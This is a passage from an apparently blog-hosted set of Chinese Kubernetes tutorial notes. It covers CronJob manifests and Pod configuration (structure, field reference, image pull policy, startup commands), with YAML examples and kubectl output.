class="string">counter-pod</span>]&#125;</span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">metadata:</span></span><br><span class="line">          <span class="attr">labels:</span></span><br><span class="line">            <span class="attr">app:</span> <span class="string">counter-pod</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">restartPolicy:</span> <span class="string">Never</span> </span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">counter</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">            <span class="attr">command:</span> [<span class="string">&quot;bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">需要重点解释的几个选项：</span></span><br><span class="line"><span class="attr">schedule:</span> <span class="string">cron表达式，用于指定任务的执行时间</span></span><br><span class="line">    <span class="string">*/1</span>    <span class="string">*</span>      <span class="string">*</span>    <span class="string">*</span>     <span class="string">*</span></span><br><span class="line">    <span class="string">&lt;分钟&gt;</span> <span class="string">&lt;小时&gt;</span> <span class="string">&lt;日&gt;</span> <span class="string">&lt;月份&gt;</span> <span class="string">&lt;星期&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">分钟</span> <span class="string">值从</span> <span class="number">0</span> <span class="string">到</span> <span class="number">59</span><span class="string">.</span></span><br><span class="line">    <span class="string">小时</span> <span class="string">值从</span> <span class="number">0</span> <span class="string">到</span> <span class="number">23</span><span class="string">.</span></span><br><span class="line">    <span class="string">日</span> <span class="string">值从</span> <span class="number">1</span> <span class="string">到</span> <span class="number">31</span><span class="string">.</span></span><br><span class="line">    <span class="string">月</span> <span class="string">值从</span> <span class="number">1</span> <span class="string">到</span> <span class="number">12</span><span class="string">.</span></span><br><span class="line">    <span class="string">星期</span> <span class="string">值从</span> <span class="number">0</span> <span class="string">到</span> <span class="number">6</span><span class="string">,</span> <span class="number">0</span> <span class="string">代表星期日</span></span><br><span class="line">    <span class="string">多个时间可以用逗号隔开；</span> <span class="string">范围可以用连字符给出；*可以作为通配符；</span> <span class="string">/表示每...</span></span><br><span class="line"><span class="attr">concurrencyPolicy:</span></span><br><span class="line">    <span class="attr">Allow:</span>   <span class="string">允许Jobs并发运行(默认)</span></span><br><span class="line">    <span class="attr">Forbid:</span>  <span class="string">禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行</span></span><br><span class="line">    <span class="attr">Replace:</span> <span class="string">替换，取消当前正在运行的作业并用新作业替换它</span></span><br></pre></td></tr></table></figure><p>创建pc-cronjob.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CronJob</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-cronjob</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">cronjob</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">&quot;*/1 * * * *&quot;</span></span><br><span class="line">  <span class="attr">jobTemplate:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">restartPolicy:</span> <span class="string">Never</span></span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">counter</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">            <span class="attr">command:</span> [<span class="string">&quot;bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建cronjob</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml</span><br><span class="line">cronjob.batch/pc-cronjob created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看cronjob</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get cronjobs -n dev</span><br><span class="line">NAME         SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE</span><br><span class="line">pc-cronjob   */1 * * * *   False     0        &lt;none&gt;          6s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看job</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get jobs -n dev</span><br><span class="line">NAME                    COMPLETIONS   DURATION   AGE</span><br><span class="line">pc-cronjob-1592587800   1/1           28s        3m26s</span><br><span class="line">pc-cronjob-1592587860   1/1           28s        2m26s</span><br><span class="line">pc-cronjob-1592587920   1/1           28s        86s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">pc-cronjob-1592587800-x4tsm   0/1     Completed   0          2m24s</span><br><span class="line">pc-cronjob-1592587860-r5gv4   0/1     Completed   0          84s</span><br><span class="line">pc-cronjob-1592587920-9dxxq   1/1     Running     0          24s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除cronjob</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml</span><br><span class="line">cronjob.batch &quot;pc-cronjob&quot; deleted</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 5</title>
      <link href="/2022/07/12/b5779fc47159-q1jun/"/>
      <url>/2022/07/12/b5779fc47159-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="5-Pod详解"><a href="#5-Pod详解" class="headerlink" title="5. Pod详解"></a>5. Pod详解</h1><h2 id="5-1-Pod介绍"><a href="#5-1-Pod介绍" class="headerlink" title="5.1 Pod介绍"></a>5.1 Pod介绍</h2><h3 id="5-1-1-Pod结构"><a href="#5-1-1-Pod结构" class="headerlink" title="5.1.1 Pod结构"></a>5.1.1 Pod结构</h3><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200407121501907-1626781151898.png" alt="image-20200407121501907"></p><p>每个Pod中都可以包含一个或者多个容器，这些容器可以分为两类：</p><ul><li><p>用户程序所在的容器，数量可多可少</p></li><li><p>Pause容器，这是每个Pod都会有的一个<strong>根容器</strong>，它的作用有两个：</p><ul><li><p>可以以它为依据，评估整个Pod的健康状态</p></li><li><p>可以在根容器上设置Ip地址，其它容器都此Ip（Pod IP），以实现Pod内部的网路通信</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里是Pod内部的通讯，Pod的之间的通讯采用虚拟二层网络技术来实现，我们当前环境用的是Flannel</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="5-1-2-Pod定义"><a href="#5-1-2-Pod定义" class="headerlink" title="5.1.2 Pod定义"></a>5.1.2 Pod定义</h3><p>下面是Pod的资源清单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1     #必选，版本号，例如v1</span><br><span class="line">kind: Pod       　 #必选，资源类型，例如 Pod</span><br><span class="line">metadata:       　 #必选，元数据</span><br><span class="line">  name: string     #必选，Pod名称</span><br><span class="line">  namespace: string  #Pod所属的命名空间,默认为&quot;default&quot;</span><br><span class="line">  labels:       　　  #自定义标签列表</span><br><span class="line">    - name: string      　          </span><br><span class="line">spec:  #必选，Pod中容器的详细定义</span><br><span class="line">  containers:  #必选，Pod中容器列表</span><br><span class="line">  - name: string   #必选，容器名称</span><br><span class="line">    image: string  #必选，容器的镜像名称</span><br><span class="line">    imagePullPolicy: [ Always|Never|IfNotPresent ]  #获取镜像的策略 </span><br><span class="line">    command: [string]   #容器的启动命令列表，如不指定，使用打包时使用的启动命令</span><br><span class="line">    args: [string]      #容器的启动命令参数列表</span><br><span class="line">    workingDir: string  #容器的工作目录</span><br><span class="line">    volumeMounts:       #挂载到容器内部的存储卷配置</span><br><span class="line">    - name: string      #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名</span><br><span class="line">      mountPath: string #存储卷在容器内mount的绝对路径，应少于512字符</span><br><span class="line">      readOnly: boolean #是否为只读模式</span><br><span class="line">    ports: #需要暴露的端口库号列表</span><br><span class="line">    - name: string        #端口的名称</span><br><span class="line">      containerPort: int  #容器需要监听的端口号</span><br><span class="line">      hostPort: int       #容器所在主机需要监听的端口号，默认与Container相同</span><br><span class="line">      protocol: string    #端口协议，支持TCP和UDP，默认TCP</span><br><span class="line">    env:   #容器运行前需设置的环境变量列表</span><br><span class="line">    - name: string  #环境变量名称</span><br><span class="line">      value: string #环境变量的值</span><br><span class="line">    resources: #资源限制和请求的设置</span><br><span class="line">      limits:  #资源限制的设置</span><br><span class="line">        cpu: string     #Cpu的限制，单位为core数，将用于docker run --cpu-shares参数</span><br><span class="line">        memory: string  #内存限制，单位可以为Mib/Gib，将用于docker run --memory参数</span><br><span class="line">      requests: #资源请求的设置</span><br><span class="line">        cpu: string    #Cpu请求，容器启动的初始可用数量</span><br><span class="line">        memory: string #内存请求,容器启动的初始可用数量</span><br><span class="line">    lifecycle: #生命周期钩子</span><br><span class="line">        postStart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启</span><br><span class="line">        preStop: #容器终止前执行此钩子,无论结果如何,容器都会终止</span><br><span class="line">    livenessProbe:  #对Pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器</span><br><span class="line">      exec:       　 #对Pod容器内检查方式设置为exec方式</span><br><span class="line">        command: [string]  #exec方式需要制定的命令或脚本</span><br><span class="line">      httpGet:       #对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port</span><br><span class="line">        path: string</span><br><span class="line">        port: number</span><br><span class="line">        host: string</span><br><span class="line">        scheme: string</span><br><span class="line">        HttpHeaders:</span><br><span class="line">        - name: string</span><br><span class="line">          value: string</span><br><span class="line">      tcpSocket:     #对Pod内个容器健康检查方式设置为tcpSocket方式</span><br><span class="line">         port: number</span><br><span class="line">       initialDelaySeconds: 0       #容器启动完成后首次探测的时间，单位为秒</span><br><span class="line">       timeoutSeconds: 0    　　    #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒</span><br><span class="line">       periodSeconds: 0     　　    #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次</span><br><span class="line">       successThreshold: 0</span><br><span class="line">       failureThreshold: 0</span><br><span class="line">       securityContext:</span><br><span class="line">         privileged: false</span><br><span class="line">  restartPolicy: [Always | Never | OnFailure]  #Pod的重启策略</span><br><span class="line">  nodeName: &lt;string&gt; #设置NodeName表示将该Pod调度到指定到名称的node节点上</span><br><span class="line">  nodeSelector: obeject #设置NodeSelector表示将该Pod调度到包含这个label的node上</span><br><span class="line">  imagePullSecrets: #Pull镜像时使用的secret名称，以key：secretkey格式指定</span><br><span class="line">  - name: string</span><br><span class="line">  hostNetwork: false   #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络</span><br><span class="line">  volumes:   #在该pod上定义共享存储卷列表</span><br><span class="line">  - name: string    #共享存储卷名称 （volumes类型有很多种）</span><br><span class="line">    emptyDir: &#123;&#125;       #类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值</span><br><span class="line">    hostPath: string   #类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录</span><br><span class="line">      path: string      　　        #Pod所在宿主机的目录，将被用于同期中mount的目录</span><br><span class="line">    secret:       　　　#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部</span><br><span class="line">      scretname: string  </span><br><span class="line">      items:     </span><br><span class="line">      - key: string</span><br><span class="line">        path: string</span><br><span class="line">    configMap:         #类型为configMap的存储卷，挂载预定义的configMap对象到容器内部</span><br><span class="line">      name: string</span><br><span class="line">      items:</span><br><span class="line">      - key: string</span><br><span class="line">        path: string</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">小提示：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  在这里，可通过一个命令来查看每种资源的可配置项</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  kubectl explain 资源类型         查看某种资源可以配置的一级属性</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  kubectl explain 资源类型.属性     查看属性的子属性</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl explain pod</span><br><span class="line">KIND:     Pod</span><br><span class="line">VERSION:  v1</span><br><span class="line">FIELDS:</span><br><span class="line">   apiVersion   &lt;string&gt;</span><br><span class="line">   kind &lt;string&gt;</span><br><span class="line">   metadata     &lt;Object&gt;</span><br><span class="line">   spec &lt;Object&gt;</span><br><span class="line">   status       &lt;Object&gt;</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# kubectl explain pod.metadata</span><br><span class="line">KIND:     Pod</span><br><span class="line">VERSION:  v1</span><br><span class="line">RESOURCE: metadata &lt;Object&gt;</span><br><span class="line">FIELDS:</span><br><span class="line">   annotations  &lt;map[string]string&gt;</span><br><span class="line">   clusterName  &lt;string&gt;</span><br><span class="line">   creationTimestamp    &lt;string&gt;</span><br><span class="line">   deletionGracePeriodSeconds   &lt;integer&gt;</span><br><span class="line">   deletionTimestamp    &lt;string&gt;</span><br><span class="line">   finalizers   &lt;[]string&gt;</span><br><span class="line">   generateName &lt;string&gt;</span><br><span class="line">   generation   &lt;integer&gt;</span><br><span class="line">   labels       &lt;map[string]string&gt;</span><br><span class="line">   managedFields        &lt;[]Object&gt;</span><br><span class="line">   name &lt;string&gt;</span><br><span class="line">   namespace    &lt;string&gt;</span><br><span class="line">   ownerReferences      &lt;[]Object&gt;</span><br><span class="line">   resourceVersion      &lt;string&gt;</span><br><span class="line">   selfLink     &lt;string&gt;</span><br><span class="line">   uid  &lt;string&gt;</span><br></pre></td></tr></table></figure><p>在kubernetes中基本所有资源的一级属性都是一样的，主要包含5部分：</p><ul><li>apiVersion <string> 版本，由kubernetes内部定义，版本号必须可以用 kubectl api-versions 查询到</li><li>kind <string> 类型，由kubernetes内部定义，版本号必须可以用 kubectl api-resources 查询到</li><li>metadata <Object> 元数据，主要是资源标识和说明，常用的有name、namespace、labels等</li><li>spec <Object> 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述</li><li>status <Object> 状态信息，里面的内容不需要定义，由kubernetes自动生成</li></ul><p>在上面的属性中，spec是接下来研究的重点，继续看下它的常见子属性:</p><ul><li>containers &lt;[]Object&gt; 容器列表，用于定义容器的详细信息</li><li>nodeName <String> 根据nodeName的值将pod调度到指定的Node节点上</li><li>nodeSelector &lt;map[]&gt; 根据NodeSelector中定义的信息选择将该Pod调度到包含这些label的Node 上</li><li>hostNetwork <boolean> 是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络</li><li>volumes &lt;[]Object&gt; 存储卷，用于定义Pod上面挂在的存储信息</li><li>restartPolicy <string> 重启策略，表示Pod在遇到故障的时候的处理策略</li></ul><h2 id="5-2-Pod配置"><a href="#5-2-Pod配置" class="headerlink" title="5.2 Pod配置"></a>5.2 Pod配置</h2><p>本小节主要来研究<code>pod.spec.containers</code>属性，这也是pod配置中最为关键的一项配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl explain pod.spec.containers</span><br><span class="line">KIND:     Pod</span><br><span class="line">VERSION:  v1</span><br><span class="line">RESOURCE: containers &lt;[]Object&gt;   # 数组，代表可以有多个容器</span><br><span class="line">FIELDS:</span><br><span class="line">   name  &lt;string&gt;     # 容器名称</span><br><span class="line">   image &lt;string&gt;     # 容器需要的镜像地址</span><br><span class="line">   imagePullPolicy  &lt;string&gt; # 镜像拉取策略 </span><br><span class="line">   command  &lt;[]string&gt; # 容器的启动命令列表，如不指定，使用打包时使用的启动命令</span><br><span class="line">   args     &lt;[]string&gt; # 容器的启动命令需要的参数列表</span><br><span class="line">   env      &lt;[]Object&gt; # 容器环境变量的配置</span><br><span class="line">   ports    &lt;[]Object&gt;     # 容器需要暴露的端口号列表</span><br><span class="line">   resources &lt;Object&gt;      # 资源限制和资源请求的设置</span><br></pre></td></tr></table></figure><h3 id="5-2-1-基本配置"><a href="#5-2-1-基本配置" class="headerlink" title="5.2.1 基本配置"></a>5.2.1 基本配置</h3><p>创建pod-base.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-base</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">heima</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20210617223823675-1626781695411.png" alt="image-20210617223823675"></p><p>上面定义了一个比较简单Pod的配置，里面有两个容器：</p><ul><li>nginx：用1.17.1版本的nginx镜像创建，（nginx是一个轻量级web容器）</li><li>busybox：用1.30版本的busybox镜像创建，（busybox是一个小巧的linux命令集合）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml</span><br><span class="line">pod/pod-base created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod状况</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">READY 1/2 : 表示当前Pod中有2个容器，其中1个准备就绪，1个未就绪</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RESTARTS  : 重启次数，因为有1个容器故障了，Pod一直在重启试图恢复它</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl get pod -n dev</span><br><span class="line">NAME       READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-base   1/2     Running   4          95s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过describe查看内部的详情</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时已经运行起来了一个基本的Pod，虽然它暂时有问题</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev</span><br></pre></td></tr></table></figure><h3 id="5-2-2-镜像拉取"><a href="#5-2-2-镜像拉取" class="headerlink" title="5.2.2 镜像拉取"></a>5.2.2 镜像拉取</h3><p>创建pod-imagepullpolicy.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-imagepullpolicy</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">Never</span> <span class="comment"># 用于设置镜像拉取策略</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20210617223923659.png" alt="image-20210617223923659"></p><p>imagePullPolicy，用于设置镜像拉取策略，kubernetes支持配置三种拉取策略：</p><ul><li>Always：总是从远程仓库拉取镜像（一直远程下载）</li><li>IfNotPresent：本地有则使用本地镜像，本地没有则从远程仓库拉取镜像（本地有就本地 本地没远程下载）</li><li>Never：只使用本地镜像，从不去远程仓库拉取，本地没有就报错 （一直使用本地）</li></ul><blockquote><p>默认值说明：</p><p>如果镜像tag为具体版本号， 默认策略是：IfNotPresent</p><p>如果镜像tag为：latest（最终版本） ，默认策略是always</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml</span><br><span class="line">pod/pod-imagepullpolicy created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod详情</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时明显可以看到nginx镜像有一步Pulling image <span class="string">&quot;nginx:1.17.1&quot;</span>的过程</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev</span><br><span class="line">......</span><br><span class="line">Events:</span><br><span class="line">  Type     Reason     Age               From               Message</span><br><span class="line">  ----     ------     ----              ----               -------</span><br><span class="line">  Normal   Scheduled  &lt;unknown&gt;         default-scheduler  Successfully assigned dev/pod-imagePullPolicy to node1</span><br><span class="line">  Normal   Pulling    32s               kubelet, node1     Pulling image &quot;nginx:1.17.1&quot;</span><br><span class="line">  Normal   Pulled     26s               kubelet, node1     Successfully pulled image &quot;nginx:1.17.1&quot;</span><br><span class="line">  Normal   Created    26s               kubelet, node1     Created container nginx</span><br><span class="line">  Normal   Started    25s               kubelet, node1     Started container nginx</span><br><span class="line">  Normal   Pulled     7s (x3 over 25s)  kubelet, node1     Container image &quot;busybox:1.30&quot; already present on machine</span><br><span class="line">  Normal   Created    7s (x3 over 25s)  kubelet, node1     Created container busybox</span><br><span class="line">  Normal   Started    7s (x3 over 25s)  kubelet, node1     Started container busybox</span><br></pre></td></tr></table></figure><h3 id="5-2-3-启动命令"><a href="#5-2-3-启动命令" class="headerlink" title="5.2.3 启动命令"></a>5.2.3 启动命令</h3><p>在前面的案例中，一直有一个问题没有解决，就是的busybox容器一直没有成功运行，那么到底是什么原因导致这个容器的故障呢？</p><p>原来busybox并不是一个程序，而是类似于一个工具类的集合，kubernetes集群启动管理后，它会自动关闭。解决方法就是让其一直在运行，这就用到了command配置。</p><p>创建pod-command.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 